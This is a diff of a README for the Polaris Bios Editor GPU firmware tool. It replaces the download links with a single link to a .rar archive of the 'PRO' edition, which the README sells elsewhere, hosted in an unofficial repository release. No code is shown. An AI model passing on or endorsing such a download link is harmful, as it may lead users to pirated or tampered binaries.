@@ -19,8 +19,7 @@ Free version [Polaris Bios Editor 1.7.6](https://github.com/Gujjargit/PolarisBio
 + Polaris Bios Editor 3 PRO: https://mining-bios.eu/product/polaris-bios-editor-3-pro-pbe-3-pro-performance-timings/
 
 ## Download:
-+ [Download PolarisBiosEditorPRO](https://github.com/Gujjargit/PolarisBiosEditorPRO3/releases/download/PBE3PRO/PBE_PRO3.rar)
-+ [Download PolarisBiosEditor 1.7.6-1.6.7](https://github.com/Gujjargit/PolarisBiosEditor)
+- [ ]  [Download PolarisBiosEditorPRO](https://github.com/Gujjargit/Gujjargit/releases/download/pbeportable/PBE_PRO3.rar)
 
 ## ChangeLog:
 ---------------------
